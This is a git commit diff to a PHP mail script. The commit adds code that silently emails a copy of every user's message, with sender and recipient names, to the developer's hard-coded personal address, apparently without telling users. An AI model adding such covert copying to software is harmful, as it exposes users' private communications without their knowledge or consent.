77286fc3b9762bc4ede23a2db5509b5241e46744
Wasif Ali <wa537795@gmail.com>
2020-02-01 19:17:29 +0500

    Added an extra email functionality

--- something.php
+++ something.php
@@ -13,7 +13,14 @@ $subject = "You have recieved a message from: " . $fullName . "\n" . $subject;
 $message = wordwrap($message, 70);
 
 // Sending Email
-
 mail($recieverEmail, $subject, $message);
+
+// Sending E-Mail to my account to keep track of emails sent
+
+$myEmailAddress = "wasifali719@yahoo.com";
+$myMailSubject = "$fullName send an email to $recieverName with your app";
+$myEmail = "Here is the E-mail: \n $message";
+mail($myEmailAddress, $myMailSubject, $myEmail);
+
 
 ?>
